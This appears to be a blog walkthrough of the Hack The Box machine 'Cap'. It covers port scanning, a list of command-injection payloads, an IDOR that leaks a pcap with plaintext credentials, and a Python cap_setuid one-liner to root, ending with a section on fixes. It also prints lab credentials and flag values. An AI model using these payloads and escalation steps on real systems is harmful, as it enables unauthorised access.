---
title: "Cap - Hack The Box Walkthrough"
description: "Popping Cap on HTB by finding an IDOR vulnerability and abusing Linux capabilities for a quick root."
date: 2026-07-24
tags: ["hackthebox", "linux", "idor", "capabilities", "privilege-escalation"]
authors: ["0xakr4m"]
image: ../images/headers/vagabond-cap.png
draft: false
---

> "The important thing in strategy is to suppress the enemy's useful actions but allow his useless actions." — Miyamoto Musashi, *Vagabond*

What's good, cyber ronins? We're diving into **Cap**, a Hack The Box machine that really tests whether you can spot the obvious or if you're going to overthink yourself into a corner. Honestly, I spent half my time trying to do some gigabrain command injections before realizing the answer was literally staring right back at me. No 0-days, no obscure exploits—just plain old IDOR and some misconfigured Linux capabilities letting me secure the bag. 

Let's get into it. 🗡️

## 1. Quick Info Card

| Attribute | Value |
|-----------|-------|
| **Machine Name** | Cap |
| **OS / Type** | Linux |
| **Difficulty** | Easy |
| **Key Vulnerability** | IDOR (Insecure Direct Object Reference) + Linux Capabilities (`cap_setuid`) |

## 2. The Game Plan & The Rabbit Holes (Red Teamer Mindset)

Alright, let me set the scene. I fired up the VPN, did the obligatory `ping` to make sure the box was alive, and then let `masscan` do its thing. The results came back: **FTP (21), SSH (22), HTTP (80)**. Standard-issue Linux box. Nothing screamed "hack me" yet.

**The Rabbit Hole:**
I spent an embarrassing amount of time staring at the web app thinking, "There's no way this is just a dashboard... right?" The `/ip`, `/netstat`, and `/capture` endpoints looked like they were executing system commands. My brain immediately went "COMMAND INJECTION!" I started throwing semicolons and pipes like a madman:
- `GET /ip;whoami`
- `GET /netstat?test=;whoami`
- `GET /capture;whoami`
- `GET /data/2;sleep 5`
- POST requests with `interface=eth0;whoami`
- Header injection (`X-Forwarded-For: 127.0.0.1;whoami`)
- Fuzzed every possible parameter (`search`, `test`, `q`, `cmd`)

And you know what? **Nothing.** No output, no delay, just 404s or redirects. The app was either sanitizing everything or just ignoring my payloads. Big facepalm moment right there: I was trying to find a vulnerability that literally did not exist. Absolute smooth-brain behavior.

**The Plot Twist:**
Then I noticed the `/capture` endpoint redirects to `/data/2` with a numeric ID. That number looked suspiciously like an object ID. I changed `2` to `0` and... **bam!** A completely different packet capture page loaded. IDOR, baby. The app was just blindly serving whatever data ID I asked for, with zero authentication checks. No command injection needed—just changing a number like I'm playing Sudoku.

**The Eureka Moment:**
Downloaded the PCAP from `/download/0`, fired up Wireshark, and there it was—plaintext FTP credentials staring at me like a deer in headlights: `nathan:Buck3tH4TF0RM3!`. I had my foothold. 

## 3. The Execution (Step-by-Step Walkthrough)

### Recon

**Port Scan:**
```bash
masscan -p1-65535 10.129.61.116 --rate=1000 -oG masscan.out
```
Found ports 21 (FTP), 22 (SSH), and 80 (HTTP).

**Service Enumeration:**
```bash
nmap -sS -sV -p21,22,80 10.129.61.116
```

**Web Enumeration:**
Navigated to `http://10.129.61.116/` and found a "Security Dashboard" with endpoints:
- `/ip` - shows `ifconfig` output
- `/netstat` - shows `netstat` output  
- `/capture` - redirects to `/data/2`

The `/data/2` endpoint displayed a table with packet statistics and a "Download" button pointing to `/download/2`. The numeric ID immediately caught my attention.

### Initial Access (The User Flag)

**IDOR Vulnerability:**
Tried accessing `/data/0` and `/download/0`. Both worked. I downloaded `0.pcap`.

**Analyzing the PCAP:**
```bash
strings 0.pcap | grep -i "user\|pass"
```
Output showed:
```
USER nathan
PASS Buck3tH4TF0RM3!
```

**FTP Login:**
```bash
ftp nathan@10.129.61.116
Password: Buck3tH4TF0RM3!
```
Listed files and found `user.txt`:
```bash
ftp> ls
-r-------- 1 1001 1001 33 Jul 24 18:04 user.txt
ftp> get user.txt
```
**User Flag:** `3d438071131fedc1bb607752cc379e66`

**SSH Access:**
Same credentials worked for SSH:
```bash
ssh nathan@10.129.61.116
Password: Buck3tH4TF0RM3!
```

### Privilege Escalation (The Root Flag)

**Initial Enumeration:**
Checked `sudo -l` - asked for password. No dice.

**SUID Binaries:**
```bash
find / -perm -4000 -type f 2>/dev/null
```
Found `pkexec` version 0.105. Attempted CVE-2021-4034 (PwnKit) manual exploit but it asked for password. System was patched.

**Kernel Exploit Attempt:**
```bash
uname -a
# Linux cap 5.4.0-80-generic
```
Tried CVE-2021-3493 (OverlayFS) exploit but got `setxattr failed: Invalid argument`. Another dead end.

**The Winning Vector - Linux Capabilities:**
```bash
getcap -r / 2>/dev/null | grep python
```
Found:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
Python 3.8 had the `cap_setuid` capability, allowing it to change its user ID.

**Root Shell:**
```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Got a root shell immediately. EZ mode.

**Root Flag:**
```bash
root@cap:~# cat /root/root.txt
45c286693f3497e40c69faf8e585c868
```

## 4. How to Patch This (The Blue Team Defense)

### Root Cause Analysis

**Vulnerability 1: IDOR (Insecure Direct Object Reference)**
- The application allowed users to access arbitrary data IDs without verifying ownership or permissions.
- The ID was passed directly as a URL parameter (`/data/2`, `/download/2`), and the server served the file regardless of the requester.
- In real-world terms, you'd want to implement proper session-based access control. Each user should only be able to access their own captures, not anyone else's.

**Fix for IDOR:**
```python
# Example: Flask pseudo-code
@app.route('/data/<int:capture_id>')
def view_capture(capture_id):
    # Always check if the current user owns this capture
    if not current_user.owns_capture(capture_id):
        abort(403)
    return render_capture(capture_id)
```

**Vulnerability 2: Linux Capability Misconfiguration**
- Python 3.8 had the `cap_setuid` capability, allowing any user to execute Python and call `setuid(0)`.
- This capability is usually unnecessary for Python in normal operation and grants trivial root access.
- In production, you should audit and restrict capabilities. Use `getcap -r /` to find all capabilities and remove unnecessary ones.

**Fix for Capability Misconfiguration:**
```bash
# Remove the capability from Python
sudo setcap -r /usr/bin/python3.8
```
Or, if the capability is truly needed for specific functionality (which is rare), restrict the file permissions and use a dedicated user/group.

## 5. Final Thoughts

> "The sword is the mind. The mind is the sword." — Miyamoto Musashi

You cannot separate the tool from the craftsman. A misconfigured capability or an IDOR vulnerability is like a sword left carelessly on the ground—someone will eventually pick it up. The solution isn't to blame the attacker; it's to secure the battlefield. Understand your systems, audit your permissions, and never assume that "it's just a dashboard" means "it's safe." Keep your blades sharp and your endpoints authenticated.

Stay out of trouble, or at least don't get caught. ✌️
